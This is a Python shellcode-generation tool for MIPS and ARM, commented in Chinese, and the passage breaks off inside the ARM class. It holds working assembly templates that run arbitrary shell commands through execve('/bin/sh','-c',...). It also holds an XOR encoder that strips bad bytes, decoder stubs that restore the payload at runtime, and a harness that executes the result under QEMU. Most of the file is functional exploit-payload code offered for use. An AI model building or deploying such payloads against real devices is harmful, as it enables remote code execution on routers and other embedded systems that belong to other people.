import shutil
import sys
import os
import subprocess
import argparse
import random
import textwrap
import urllib.parse
from pwn import *

# --- 配置你的交叉编译器路径 ---
current_user = os.getlogin()
os.makedirs("shellcode_directory", exist_ok=True)
config = {
    "shellcode_directory": "shellcode_directory",  # 存放生成的shellcode文件的目录
    # ARM 编译器路径 (例如: arm-linux-musleabi-)
    "ARM_TOOLCHAIN_PATH": None,
    # MIPS 编译器路径 (例如: mips-linux-gnu-)
    "MIPS_TOOLCHAIN_PATH": None,
    "qemu_path": None,
    "DOWNLOAD_MIPS_TOOLCHAIN_URL": "https://toolchains.bootlin.com/downloads/releases/toolchains/mips32/tarballs/mips32--glibc--stable-2024.05-1.tar.xz"
}


class MipsShellcodeGenerator:
    """
    一个用于生成 MIPS (o32 ABI) execve shellcode 的类。

    该类将 MIPS 汇编模板、用户命令和交叉编译工具链结合起来，
    自动完成汇编、链接和提取字节码的整个过程。
    """
    # 汇编代码模板，与您提供的 mips_shellcode.S 文件内容一致。
    # 我们保留了一个占位符 {command_string_len} 以便动态计算偏移。
    ASM_TEMPLATE = """
# MIPS execve("/bin/sh", ["/bin/sh", "-c", command], NULL) shellcode
.section .text
.globl __start
.set noreorder

__start:
    # --- 第 1 部分：位置无关代码 (PIC) ---
    bal     find_data
    nop                 # 分支延迟槽, $ra 将指向这里

find_data:
    # $ra 现在指向 nop 指令。
    # 我们需要计算从 nop 到数据区的偏移。
    # 代码部分共 14 条指令 = 56 字节。
    addu $s0, $ra, 56   # $s0 = 数据区的基地址

    # --- 第 2 部分：在栈上构建参数数组 (argv) ---
    move $s1, $s0                               # $s1 -> "/bin/sh"
    addiu $s2, $s0, 8                           # $s2 -> "-c"
    addiu $s3, $s0, 11                          # $s3 -> your_cmd

    # 为 argv 数组在栈上分配空间 (4个指针 = 16字节)
    addiu $sp, $sp, -16

    sw $s1, 0($sp)      # argv[0] = &"/bin/sh"
    sw $s2, 4($sp)      # argv[1] = &"-c"
    sw $s3, 8($sp)      # argv[2] = &command
    sw $zero, 12($sp)   # argv[3] = NULL

    # --- 第 3 部分：执行系统调用 ---
    move $a0, $s1       # a0 = path
    move $a1, $sp       # a1 = argv
    move $a2, $zero     # a2 = envp

    li $v0, 4011        # syscall: execve
    syscall

# --- 第 4 部分：数据区 ---
.asciiz "/bin/sh"
.asciiz "-c"
.asciiz "{command}"
"""

    def __init__(self, cmd, save_file=False):
        """
        初始化生成器。

        :param cmd: 您希望 shellcode 执行的命令字符串 (例如 "ls -l")。
        :param cross_compiler_prefix: MIPS 交叉编译工具链的前缀。
        """
        if not cmd:
            raise ValueError("命令不能为空。")
        self.cmd = cmd
        self.save_file = save_file
        self.raw_shellcode = None
        self.generate()

    def generate(self):
        """
        执行编译流程并生成 shellcode。
        :return: 包含原始 shellcode 的 bytes 对象，如果失败则返回 None。
        """
        final_asm_code = self.ASM_TEMPLATE.format(command=self.cmd)
        try:
            asm_file_path = os.path.join(config["shellcode_directory"], "raw_shellcode.s")
            obj_file_path = os.path.join(config["shellcode_directory"], "raw_shellcode.o")
            elf_file_path = os.path.join(config["shellcode_directory"], "raw_shellcode.elf")
            bin_file_path = os.path.join(config["shellcode_directory"], "raw_shellcode.bin")
            # 1. 写入汇编文件
            with open(asm_file_path, "w") as f:
                f.write(final_asm_code)
            # 2. 汇编 (as)
            subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}as", "-o", obj_file_path, asm_file_path], check=True)
            # 3. 链接 (ld)
            subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}ld", "-o", elf_file_path, obj_file_path], check=True)
            # 4. 提取 .text 段 (objcopy)
            subprocess.run([
                f"{config['MIPS_TOOLCHAIN_PATH']}objcopy",
                "-O", "binary",
                "--only-section=.text",
                elf_file_path,
                bin_file_path
            ], check=True)

            # 5. 读取最终的 shellcode
            with open(bin_file_path, "rb") as f:
                self.raw_shellcode = f.read()
        finally:
            # 清理临时文件
            if self.save_file == False:
                for f in [asm_file_path, obj_file_path, elf_file_path, bin_file_path]:
                    if os.path.exists(f):
                        os.remove(f)
            else:
                print(f"\n[+] 中间文件已保存:")
                print(f"  - 汇编文件: {asm_file_path}")
                print(f"  - 目标文件: {obj_file_path}")
                print(f"  - 链接文件: {elf_file_path}")
                print(f"  - 二进制文件: {bin_file_path}")


class MipsShellcodeGenerator_long:
    def __init__(self, cmd, arch, save_file=False):
        self.cmd = cmd
        self.arch = arch
        self.save_file = save_file
        self.xxd_bin_file = None
        self.raw_shellcode = None
        self.generate()

    def generate(self):
        """
        根据指定的架构(arm/mips)和命令生成对应的shellcode。

        Args:
            cmd (str): 希望shellcode执行的命令，例如 "ls -l"。
            arch (str): 目标架构，'arm' 或 'mips'。

        Returns:
            bytes: 生成的原始二进制shellcode。
        """
        # --- 1. 根据架构选择不同的内联汇编和编译器 ---
        if self.arch.lower() == 'arm':
            # ARM的execve系统调用号是 11
            # r7=syscall_num, r0=filename, r1=argv, r2=envp
            asm_code = """
            __asm__ volatile (
                "mov r7, %0\\n\\t"
                "mov r0, %1\\n\\t"
                "mov r1, %2\\n\\t"
                "mov r2, #0\\n\\t"
                "svc #0\\n\\t"
                :
                : "i"(11), "r"(arg0), "r"(args)
                : "r0", "r1", "r2", "r7"
            );
            """
            compiler_cmd = f"{config['ARM_TOOLCHAIN_PATH']}/arm-buildroot-linux-uclibcgnueabihf-gcc-13.3.0"
            objcopy_cmd = f"{config['ARM_TOOLCHAIN_PATH']}/arm-buildroot-linux-uclibcgnueabihf-objcopy"
            odjdump_cmd = f"{config['ARM_TOOLCHAIN_PATH']}/arm-buildroot-linux-uclibcgnueabihf-objdump"
        elif self.arch.lower() == 'mips':
            # MIPS (O32 ABI) 的execve系统调用号是 4011
            # $v0=syscall_num, $a0=filename, $a1=argv, $a2=envp
            asm_code = """
            __asm__ volatile (
                "li $v0, 4011\\n\\t"
                "move $a0, %0\\n\\t"
                "move $a1, %1\\n\\t"
                "li $a2, 0\\n\\t"
                "syscall\\n\\t"
                :
                : "r"(arg0), "r"(args)
                : "$v0", "$a0", "$a1", "$a2"
            );
            """
        # --- 2. 构建完整的C语言源码 ---
        # 使用C代码动态构建字符串和参数数组
        shellcode_c = f"""
    #include <sys/syscall.h>

    void _start() {{
        // 构建 execve 的参数
        {self.format_c_char_array("arg0", "/bin/sh")}
        {self.format_c_char_array("arg1", "-c")}
        {self.format_c_char_array("arg2", self.cmd)}

        char *args[] = {{arg0, arg1, arg2, 0}};

        // 执行特定架构的内联汇编
        {asm_code}
    }}
    """
        # --- 3. 编译并提取二进制代码 ---
        # 使用临时文件来处理编译过程
        c_file = os.path.join(config["shellcode_directory"], "raw_shellcode.c")
        elf_file = os.path.join(config["shellcode_directory"], "raw_shellcode")
        bin_file = os.path.join(config["shellcode_directory"], "raw_shellcode.bin")

        try:
            with open(c_file, "w") as fd:
                fd.write(shellcode_c)
            # 1. 编译C代码为ELF文件
            # -nostdlib: 不链接标准库，对于shellcode至关重要
            # -static: 静态链接，避免依赖动态库
            # -O0: 关闭优化，确保代码行为与源码一致
            subprocess.run(
                [f"{config['MIPS_TOOLCHAIN_PATH']}gcc", "-fno-stack-protector", "-nostdlib", "-static", "-O0", "-o",
                 elf_file, c_file],
                capture_output=True, text=True
            )
            # 2. 从ELF文件中提取纯二进制的.text段
            subprocess.run(
                [f"{config['MIPS_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "-j", ".text", elf_file, bin_file],
                capture_output=True, text=True
            )
            # 3. 使用objdump查看反汇编结果
            subprocess.run(
                [f"{config['MIPS_TOOLCHAIN_PATH']}objdump", "-D", "-b", "binary", "-m", self.arch.lower(), bin_file],
                capture_output=True, text=True
            )
            # 4. 读取生成的二进制shellcode
            self.xxd_bin_file = subprocess.run(
                ["xxd", "-i", bin_file],
                capture_output=True, text=True
            )
            with open(bin_file, "rb") as fd:
                self.raw_shellcode = fd.read()
        finally:
            # 清理临时文件
            if self.save_file == False:
                for f in [c_file, elf_file, bin_file]:
                    if os.path.exists(f):
                        os.remove(f)
            else:
                print(f"\n[+] 中间文件已保存:")
                print(f"  - C源码: {c_file}")
                print(f"  - ELF文件: {elf_file}")
                print(f"  - 二进制: {bin_file}")

    def format_c_char_array(self, var_name, string):
        """
        将一个Python字符串格式化为C语言的字符数组初始化代码。
        例如: "sh" -> char sh[3]; sh[0] = 's'; sh[1] = 'h'; sh[2] = '\0';
        """
        output = []
        length = len(string) + 1  # 为空终止符 '\0' 增加空间
        output.append(f"char {var_name}[{length}];")
        for i, c in enumerate(string):
            # 处理C语言中的特殊字符转义
            if c == "'":
                c_repr = "\\'"
            elif c == '\\':
                c_repr = '\\\\'
            elif c == '\n':
                c_repr = '\\n'
            elif c == '\t':
                c_repr = '\\t'
            else:
                c_repr = c
            output.append(f"{var_name}[{i}] = '{c_repr}';")
        output.append(f"{var_name}[{length - 1}] = '\\0';")
        return "\n".join(output)


class XorEncoder:
    def __init__(self, raw_shellcode, endian="big", bad_bytes=None):
        """
        初始化XOR编码器。
        Args:
            raw_shellcode (bytes): 需要被编码的原始二进制shellcode。
            bad_bytes (list, optional): 不应出现的坏字节列表 (整数形式)。默认为 [0x00, 0x0a, 0x26]。
        """
        # --- 1. 初始化属性 ---
        self.raw_shellcode = raw_shellcode
        # 使用三元表达式来设置默认的坏字节列表
        self.bad_bytes_list = bad_bytes if bad_bytes is not None else [0x00, 0x0a, 0x26]

        # 使用集合进行快速查找，效率更高
        self.bad_bytes_set = set(self.bad_bytes_list)

        # 初始化将要计算的属性
        self.key = None
        self.xor_encoded_shellcode = None
        self.xor_encoded_shellcode_bin_file = os.path.join(config["shellcode_directory"], "xor_encoded_shellcode.bin")
        print("[+] 开始进行XOR编码，处理坏字节...")
        print(f"    -- 定义的坏字节: {[hex(b) for b in self.bad_bytes_list]}")
        if endian not in ['big', 'little']:
            raise ValueError("字节序必须是 'big' 或 'little'。")
        self.endian = endian

        # --- 2. 立即执行编码流程 ---
        self.generate()

    def _pad_shellcode(self):
        """
        将shellcode填充到4字节的倍数，以进行安全的DWORD操作。
        使用 NOP (0x00) 指令进行填充，这是一个常见的做法。
        """
        padding_needed = (4 - len(self.raw_shellcode) % 4) % 4
        padded_shellcode = self.raw_shellcode
        if padding_needed > 0:
            print(f"    -- Shellcode长度不是4的倍数，需要用 NOP 填充 {padding_needed} 字节。")
            # NOP指令的字节表示
            nop_instruction = b'\x00'
            # 检查NOP指令本身是否是坏字节
            if 0x00 in self.bad_bytes_set:
                raise ValueError("填充字节 0x00 是一个坏字节，无法进行填充。请考虑其他填充方案。")
            padded_shellcode += nop_instruction * padding_needed
        return padded_shellcode

    def generate(self):
        """
        循环寻找安全的XOR密钥并加密payload。
        一个安全的密钥及其加密后的shellcode都不应包含任何坏字节。
        """
        padded_shellcode = self._pad_shellcode()

        attempts = 0
        max_attempts = 100000  # 设定最大尝试次数，防止无限循环
        print("    -- 正在寻找安全的XOR密钥...")

        while True:
            attempts += 1
            if attempts > max_attempts:
                raise RuntimeError(f"在 {max_attempts} 次尝试后仍未找到安全密钥。请检查坏字节列表或shellcode。")

            # 随机生成一个4字节（32位）的密钥
            key_int = random.randint(1, 0xFFFFFFFF)
            key_bytes = key_int.to_bytes(4, self.endian)

            # 1. 检查密钥本身是否包含坏字节
            if any(b in self.bad_bytes_set for b in key_bytes):
                continue  # 密钥不安全，尝试下一个

            # 2. 使用此候选密钥加密整个shellcode
            encoded_buffer = bytearray()
            is_encoded_safe = True
            for i in range(0, len(padded_shellcode), 4):
                chunk = padded_shellcode[i:i + 4]
                dword = int.from_bytes(chunk, self.endian)
                xored_dword_int = dword ^ key_int
                xored_dword_bytes = xored_dword_int.to_bytes(4, self.endian)

                # 3. 检查加密后的块是否包含坏字节
                if any(b in self.bad_bytes_set for b in xored_dword_bytes):
                    is_encoded_safe = False
                    break  # 此密钥生成的编码不安全，停止当前加密并尝试新密钥

                encoded_buffer.extend(xored_dword_bytes)

            # 如果整个编码过程都安全，我们就找到了最终的密钥和编码
            if is_encoded_safe:
                self.key = key_int
                self.xor_encoded_shellcode = bytes(encoded_buffer)
                print(f"[+] 成功！在 {attempts} 次尝试后找到安全密钥: {hex(self.key)}")

                # 将编码后的shellcode写入文件
                try:
                    with open(self.xor_encoded_shellcode_bin_file, "wb") as f:
                        f.write(self.xor_encoded_shellcode)
                except IOError as e:
                    print(f"[!] 错误：无法将文件写入磁盘: {e}")

                return  # 成功找到密钥，退出函数


class XorDecoder:
    """
    负责管理解码器模板，并组装最终的shellcode。
    """
    MIPS_DECODER_TEMPLATE = """
    .section .text
    .global __start
    .set noreorder
    __start:
    li $t8, -0x666
    p:
    bltzal $t8, p
    slti $t8, $zero, -1
    li $s1, {val_for_payload_start}
    nor $s1, $s1, $s1
    addu $s1, $ra, $s1
    li $t2, {val_for_loop_count}
    nor $t2, $t2, $t2
    addu $t0, $t2, $t2
    addu $t0, $t0, $t0
    addu $t0, $s1, $t0
    lui $t1, {key_high}
    ori $t1, $t1, {key_low}
    decode_loop:
    lw $t6, -4($t0)
    nor $t5, $t1, $t1
    and $t4, $t6, $t5
    nor $t5, $t6, $t6
    and $t5, $t5, $t1
    or $t4, $t4, $t5
    sw $t4, -4($t0)
    addu $t0, $t0, -4
    addiu $t2, $t2, -1
    bne $t2, $zero, decode_loop
    slti $at, $at, -1
    finished:
    jalr $ra, $s1
    slti $at, $at, -1
    """

    def __init__(self, shellcode, key, save_file=False):
        """
        初始化XOR解码器。

        Args:
            shellcode (bytes): 需要被解码的加密二进制shellcode。
            key (int): 用于解码的密钥。
            verbose (bool): 如果为True，则打印详细的编译和调试信息。
        """
        self.shellcode = shellcode
        self.key = key
        self.val_for_payload_start = None
        self.val_for_loop_count = None
        self.xor_decoded_shellcode_bin_file = os.path.join(config["shellcode_directory"], "xor_decoded_shellcode.bin")
        self.xor_decoded_shellcode = None
        self.save_file = save_file
        self._decode_len()

    def _decode_len(self):
        key_high = hex(self.key >> 16)
        key_low = hex(self.key & 0xFFFF)
        loop_count = len(self.shellcode) // 4
        val_for_loop_count = -(loop_count + 1)
        temp_asm = self.MIPS_DECODER_TEMPLATE.format(
            val_for_payload_start=-1, val_for_loop_count=-1,
            key_high=key_high, key_low=key_low
        )
        self._generate_decoder(temp_asm)
        # offset_to_payload = len(self.xor_decoded_shellcode) - 8
        # self.val_for_payload_start = -(offset_to_payload + 1)
        offset_to_payload = len(self.xor_decoded_shellcode) - 8
        self.val_for_payload_start = -(offset_to_payload - 3)
        final_asm = self.MIPS_DECODER_TEMPLATE.format(
            val_for_payload_start=self.val_for_payload_start,
            val_for_loop_count=val_for_loop_count,
            key_high=key_high,
            key_low=key_low
        )
        self._generate_decoder(final_asm)

    def _generate_decoder(self, asm_code):
        try:
            """编译汇编代码并提取.text节，返回二进制数据和其长度。"""
            s_file = os.path.join(config["shellcode_directory"], "xor_decoder.s")
            o_file = os.path.join(config["shellcode_directory"], "xor_decoder.o")
            bin_file = os.path.join(config["shellcode_directory"], "xor_decoder.bin")
            with open(s_file, "w") as f:
                f.write(asm_code)
            subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}as", "-o", o_file, s_file], capture_output=True)
            subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "-j", ".text", o_file, bin_file],
                           capture_output=True)
            with open(bin_file, "rb") as f:
                binary_data = f.read()
                # 【关键修复】在返回前就移除末尾的空字节
                self.xor_decoded_shellcode = binary_data.rstrip(b'\x00')
        finally:
            # 清理临时文件
            if self.save_file == False:
                for f in [s_file, o_file, bin_file]:
                    if os.path.exists(f):
                        os.remove(f)
            else:
                print(f"\n[+] 中间文件已保存:")
                print(f"  - C源码: {s_file}")
                print(f"  - ELF文件: {o_file}")
                print(f"  - 二进制: {bin_file}")


class Sleep:
    """
    一个独立的类，专门用于生成一段MIPS sleep(0)存根的二进制shellcode。
    这段代码旨在通过强制上下文切换来解决指令缓存(I-Cache)同步问题。
    """

    # --- 类属性：MIPS汇编模板 ---
    MIPS_SLEEP_TEMPLATE = """
#
# MIPS Sleep 存根汇编模板 (自由落体版)
#
.section .text
.global __start
.set noreorder

__start:
    # --- 使用 bal 技巧获取当前代码位置，用于计算下一段 payload 的地址 ---
    bal     get_pc
    nop                         # 延迟槽。执行后，$ra 会指向 get_pc 标签处

get_pc:
    # --- 计算下一段 payload 的地址，为 cacheflush 做准备 ---
    # $ra 指向了本条 addiu 指令。从这里到这个代码块的末尾共有 14 条指令 (14 * 4 = 56 字节)。
    # 所以 $ra + 56 就是下一段 payload (自由落体目标) 的起始地址。
    addiu   $s1, $ra, 56

    # --- Sleep 逻辑 ---
    addiu   $sp, $sp, -8
    li      $t0, 3
    sw      $t0, 0($sp)
    sw      $zero, 4($sp)
    move    $a0, $sp
    li      $v0, 4166           # nanosleep
    syscall
    addiu   $sp, $sp, 8

    # --- [关键] 清空下一段 payload 所在区域的指令缓存 ---
    move    $a0, $s1            # a0 = 要刷新的地址 (下一段payload的开头)
    li      $a1, 1024           # a1 = 刷新的长度 (一个足够大的值即可)
    li      $a2, 1              # a2 = 1 表示刷新 I-cache
    li      $v0, 4147           # cacheflush 系统调用号
    syscall

# --- [注意] 这里没有跳转指令，代码会直接“落体”到下一段 shellcode ---
"""

    def __init__(self, save_file=False, verbose=False):
        """
        初始化Sleep存根生成器。

        Args:
            save_file (bool): 如果为True，则在当前目录保存最终的.bin文件。
            verbose (bool): 如果为True，则打印详细的编译和调试信息。
        """
        self.save_file = save_file
        self.verbose = verbose
        self.bin_file_name = "sleep_stub.bin"
        self.Sleep_shellcode = None
        self.generate()

    def generate(self):
        """
        执行完整的编译流程，并返回二进制的sleep存根。

        Returns:
            bytes: 生成的二进制代码；如果失败则返回None。
        """
        # 使用临时目录来处理编译过程中的中间文件
        s_file = os.path.join(config["shellcode_directory"], "sleep_shellcode.s")
        o_file = os.path.join(config["shellcode_directory"], "sleep_shellcode.o")
        bin_file = os.path.join(config["shellcode_directory"], "sleep_shellcode.bin")

        # 将汇编模板写入.s文件
        with open(s_file, "w") as f:
            f.write(self.MIPS_SLEEP_TEMPLATE)

        if self.verbose:
            print(f"[Sleep Class] Compiling assembly file: {s_file}")

        # 编译汇编代码为对象文件(.o)
        # 使用 -c 选项只编译不链接，这是生成shellcode的关键
        subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}gcc", "-c", "-nostdlib", "-o", o_file, s_file],
                       capture_output=True, text=True)
        if self.verbose:
            print(f"[Sleep Class] Extracting .text section from {o_file}")
        # 从对象文件中提取.text节，生成纯二进制文件
        subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "-j", ".text", o_file, bin_file],
                       capture_output=True, text=True)

        # 读取最终的二进制数据
        with open(bin_file, "rb") as fd:
            sleep_shellcode = fd.read()
        self.Sleep_shellcode = sleep_shellcode
        if self.save_file:
            shutil.copy(bin_file, self.bin_file_name)
            print(f"[+] Sleep存根已保存为: {self.bin_file_name} ({len(sleep_shellcode)} bytes)")


class CTestHarnessGenerator:
    """
    一个用于生成、编译并执行C语言Shellcode测试框架的类。
    它接收原始的二进制数据(bytes)并自动格式化。
    """

    def __init__(self, shellcode_bytes):
        """
        初始化生成器。
        参数:
            shellcode_bytes (bytes): 完整的、最终的shellcode二进制数据。
        """
        if not isinstance(shellcode_bytes, bytes):
            raise TypeError("shellcode_bytes 参数必须是 bytes 类型。")
        self.shellcode_bytes = shellcode_bytes
        self.generate_and_run()

    def _format_shellcode_as_c_string(self):
        """
        [修正] 将二进制数据格式化为C语言的字符串字面量数组。
        """
        if not self.shellcode_bytes:
            return '    "";'
        c_string_lines = []
        for i in range(0, len(self.shellcode_bytes), 4):
            chunk = self.shellcode_bytes[i:i + 4]
            hex_string = "".join([f"\\x{byte:02x}" for byte in chunk])
            c_string_lines.append(f'"{hex_string}"')
        return '\n'.join(c_string_lines) + '\n;'

    def generate_and_run(self):
        """
        生成、编译并执行完整的C语言测试文件。

        参数:
            qemu_path (str): QEMU静态模拟器的路径。
        """

        # 1. [修正] 准备C代码前，先格式化shellcode
        formatted_shellcode = self._format_shellcode_as_c_string()
        final_c_code = f"""
#include <stdio.h>
#include <string.h>

char shellcode[] =
{formatted_shellcode}


void main(void)
{{
    printf("[+] Shellcode 大小: %zu 字节\\n", sizeof(shellcode) - 1);
    void (*s)(void) = (void (*)())shellcode;
    printf("[+] 准备执行shellcode...\\n");
    s();
    printf("[+] Shellcode 执行完毕。\\n");
}}
"""

        qemu_path = config['qemu_path']
        c_file_path = os.path.join(config["shellcode_directory"], "verify_shellcode.c")
        elf_file_path = os.path.join(config["shellcode_directory"], "verify_shellcode")
        # 2. 写入文件
        try:
            with open(c_file_path, "w") as f:
                f.write(final_c_code)
            print(f"[+] C语言测试文件 '{c_file_path}' 已成功生成。")
        except IOError as e:
            print(f"[-] 错误: 写入文件 '{c_file_path}' 失败: {e}")
            return
        # 3. 编译
        print(" --- [编译中] ---")
        proc = subprocess.run([
            f"{config['MIPS_TOOLCHAIN_PATH']}gcc", "-z", "execstack", "-static", "-g", "-o", elf_file_path,
            c_file_path], capture_output=True, text=True)
        if proc.returncode != 0:
            print(" [-] 编译失败!")
            print(" --- STDERR ---")
            print(proc.stderr)
            return

        print("[+] 编译成功!")
        # 4. 执行
        print(" --- [执行中] ---")

        run_proc = subprocess.run([qemu_path, elf_file_path], capture_output=True, text=True)
        print(" --- STDOUT ---")
        print(run_proc.stdout)
        if run_proc.stderr:
            print(" --- STDERR ---")
            print(run_proc.stderr)


def check_toolschain():
    """
    检查目标目录是否存在。如果不存在，则从指定的URL下载tar.gz文件并解压到该目录。
    该函数依赖于系统已安装 'wget' 和 'tar' 命令。
    """

    def check_dependencies():
        """检查所需的交叉编译工具是否存在于系统中。"""
        tools = ["gcc", "as", "ld", "objcopy"]
        for tool in tools:
            tool_name = f"{config['MIPS_TOOLCHAIN_PATH']}{tool}"
            if not shutil.which(tool_name):
                raise FileNotFoundError(
                    f"错误: 交叉编译工具 '{tool_name}' 未找到。\n"
                    f"请确保您的 MIPS 交叉编译工具链已安装并在系统 PATH 中。"
                )
        print(f"✅ 所有依赖工具均已安装。")

    # --- 2. 检查目标目录是否存在 ---
    if os.path.exists(f"{config['MIPS_TOOLCHAIN_PATH']}gcc"):
        print(f"✅ 目录 '{config['MIPS_TOOLCHAIN_PATH']}gcc' 已存在，无需执行任何操作。")
        check_dependencies()
        return True
    else:
        print(f"ℹ️ 目录 '{config['MIPS_TOOLCHAIN_PATH']}' 不存在，开始执行下载和解压任务...")
        # --- 3. 使用 wget 下载文件 ---
        try:
            filename = os.path.basename(urllib.parse.urlparse(config['DOWNLOAD_MIPS_TOOLCHAIN_URL']).path)
            print(f"🔽 正在从 '{config['DOWNLOAD_MIPS_TOOLCHAIN_URL']}' 下载文件...")
            # 构建并执行 wget 命令。-O 参数指定输出文件路径。
            wget_command = ["proxychains", "wget", config['DOWNLOAD_MIPS_TOOLCHAIN_URL'], "-O",
                            f"/home/{current_user}/{filename}"]
            # check=True 会在命令返回非零退出码时抛出异常
            subprocess.run(wget_command, check=True, capture_output=True)
            print(f"👍 下载成功，文件已保存至: /home/{current_user}/{filename}")
        except FileNotFoundError:
            print("❌ 错误: 'wget' 命令未找到。请确保它已安装并位于系统的 PATH 环境变量中。")
            return False
        except subprocess.CalledProcessError as e:
            # 捕获 wget 执行失败的错误
            print(f"❌ 使用 wget 下载失败。返回码: {e.returncode}")
            print(f"错误输出:\n{e.stderr.decode('utf-8', errors='ignore')}")
            return False

        # --- 4. 创建目录并使用 tar 解压文件 ---
        try:

            print(f"📦 正在将 '{filename}' 解压到 '/{current_user}/'...")
            print(filename)
            tar_command = ["tar", "-xf", f"/home/{current_user}/{filename}", "-C", f"/home/{current_user}/"]
            subprocess.run(tar_command, check=True, capture_output=True)
            print("👍 解压成功。")
        except FileNotFoundError:
            print("❌ 错误: 'tar' 命令未找到。请确保它已安装并位于系统的 PATH 环境变量中。")
            return False
        except subprocess.CalledProcessError as e:
            print(f"❌ 使用 tar 解压失败。返回码: {e.returncode}")
            print(f"错误输出:\n{e.stderr.decode('utf-8', errors='ignore')}")
            return False
        print(f"\n🎉 任务完成！所有文件已成功下载并解压到 /home/{current_user}/。")
        return True


def print_as_c_string(data, var_name="shellcode"):
    """
    将二进制数据打印成C语言字符串字面量的格式。
    例如: "\xde\xad\xbe\xef"
    """
    print(f"char {var_name}[] =")
    # 每4个字节为一组，生成一行字符串
    for i in range(0, len(data), 4):
        # 获取当前行的数据块
        chunk = data[i:i + 4]
        # 将每个字节格式化为 \xHH 的形式
        hex_string = "".join([f"\\x{byte:02x}" for byte in chunk])
        # 打印被双引号包围的字符串
        print(f'    "{hex_string}"')
    print(";")


def print_as_python_bytes(data, var_name="shellcode", line_len=12):
    """
    将二进制数据打印成Python中通过 += 逐行构建字节字符串的格式。
    例如: buf += b"\\xde\\xad\\xbe\\xef"
    """
    # 首先打印初始化行
    print(f'{var_name} = b""')

    # 每次处理 line_len 个字节
    for i in range(0, len(data), line_len):
        # 获取当前行的数据块
        chunk = data[i:i + line_len]
        # 将每个字节格式化为 \xHH 的形式
        hex_string = "".join([f"\\x{byte:02x}" for byte in chunk])
        # 打印 "buf += b'...'" 格式的字符串
        print(f'{var_name} += b"{hex_string}"')




class arm:
    """
    一个为 ARM 架构生成 XOR 编码 shellcode 的多功能类。

    它会自动处理坏字节，并生成一个同样不含坏字节的解码器存根（decoder stub），
    最终将解码器和加密后的 payload 拼接在一起。
    【重构说明】: 解码器已根据要求切换回 AArch32 (标准ARM) 模式。
    """
    EXECVE_TEMPLATE_ARM = """
    .section .text
    .global _start
    .arm

    _start:
        @ execve("/bin/sh", ["/bin/sh", "-c", command], NULL)
        adr r0, shell_strings   @ r0 -> "/bin/sh"

        @ 【关键修复】正确地在栈上构建 argv 数组
        @ 1. 计算其他字符串的地址
        add r1, r0, #8          @ r1 -> "-c"
        add r2, r0, #11         @ r2 -> command 字符串
        eor r3, r3, r3          @ r3 = 0 (NULL)

        @ 2. 在栈上为4个指针分配16字节空间
        sub sp, sp, #16

        @ 3. 按正确顺序存储指针
        str r0, [sp, #0]        @ argv[0] = &("/bin/sh")
        str r1, [sp, #4]        @ argv[1] = &("-c")
        str r2, [sp, #8]        @ argv[2] = &("{command}")
        str r3, [sp, #12]       @ argv[3] = NULL

        @ 4. 设置 execve 的参数
        mov r0, r0              @ r0 仍然是 &("/bin/sh")
        mov r1, sp              @ r1 = argv (现在 sp 正确地指向数组开头)
        mov r2, r3              @ r2 = envp (NULL)

        mov r7, #11             @ execve 的系统调用号
        svc #0                  @ 发起系统调用

    failed_exec:
        @ 如果 execve 失败, 则调用 exit(1) 干净地退出
        mov r0, #1              @ 设置退出码为 1
        mov r7, #1              @ exit 的系统调用号
        svc #0                  @ 发起系统调用

    shell_strings:
        .string "/bin/sh"
        .asciz "-c"
        .asciz "{command}"
    """

    # 【重构】ARM 解码器汇编模板，已切换回 ARM (AArch32) 模式。
    DECODER_TEMPLATE_ARM = """
.section .text
.global _start
.arm

_start:
    @ --- 步骤 1: 获取 payload 的地址 ---
    adr r0, payload_start     @ 获取 payload 的地址存入 r0

    @ --- 步骤 2: 加载密钥和循环次数 ---
    {key_loader}
    {count_loader}

decode_loop:
    @ --- 步骤 3: 解码循环 ---
    ldr r3, [r0]              @ 从 payload 加载一个 4 字节的字
    eor r3, r3, r1            @ 与密钥进行 XOR 操作
    str r3, [r0], #4          @ 将解码后的字写回，并让 r0 指向下一个字
    subs r2, r2, #1           @ 循环计数器减 1
    bne decode_loop           @ 如果计数器不为零，则继续循环

    @ --- 步骤 4: 跳转到已解码的 shellcode ---
    adr r0, payload_start     @ 重新获取 payload 的起始地址
    bx r0                     @ 跳转并开始执行 (CPU会保持ARM状态)

payload_start:
    @ 加密后的 shellcode 将被放置在这里
"""

    def __init__(self, command, bad_bytes=None, save_files=True, validate=False):
        """
        初始化编码器并自动执行整个编码流程。
        """
        print("[*] 初始化 ARM (AArch32) XOR 编码器...")
        # 步骤 1: 初始化所有属性
        self.encoded_shellcode = None
        self.decoder_stub = None
        self.final_shellcode = None

        self.bad_bytes = set(bad_bytes if bad_bytes is not None else [0x00])
        self.save_files = save_files
        self.key = None
        self.loop_count = 0


        # [重构] 首先，根据传入的命令生成原始 shellcode
        self.raw_shellcode = self._generate_shellcode_from_asm(command)

        # [重构] 在初始化时直接调用核心处理函数
        self.xorencoder()
        self.xordecoder()
        self.merged_shellcode()

        # [新增] 如果用户指定，则执行验证
        # if validate:
        # self.validate_shellcode()

    def _generate_shellcode_from_asm(self, command):
        """
        [重构] 使用 ARM 汇编模板和交叉编译器来生成执行特定命令的原始 shellcode。
        """
        print(f"[*] 正在从汇编代码生成原始 shellcode (命令: '{command}')...")

        final_asm = self.EXECVE_TEMPLATE_ARM.format(command=command)

        tmp_s_path = os.path.join(config["shellcode_directory"], "arm_raw_shellcode.s")
        tmp_o_path = os.path.join(config["shellcode_directory"], "arm_raw_shellcode.o")
        tmp_bin_path = os.path.join(config["shellcode_directory"], "arm_raw_shellcode.bin")

        with open(tmp_s_path, "w") as f:
            f.write(final_asm)

        try:
            cmd_as = [f"{config['ARM_TOOLCHAIN_PATH']}as", "-march=armv7-a", "-o", tmp_o_path, tmp_s_path]
            subprocess.run(cmd_as, check=True, capture_output=True)

            cmd_objcopy = [f"{config['ARM_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "-j", ".text", tmp_o_path,
                           tmp_bin_path]
            subprocess.run(cmd_objcopy, check=True, capture_output=True)

            with open(tmp_bin_path, "rb") as f:
                binary_code = f.read()

            print(f"✅ 原始 shellcode 生成成功 ({len(binary_code)} 字节).")
            return binary_code
        finally:
            if not self.save_files:
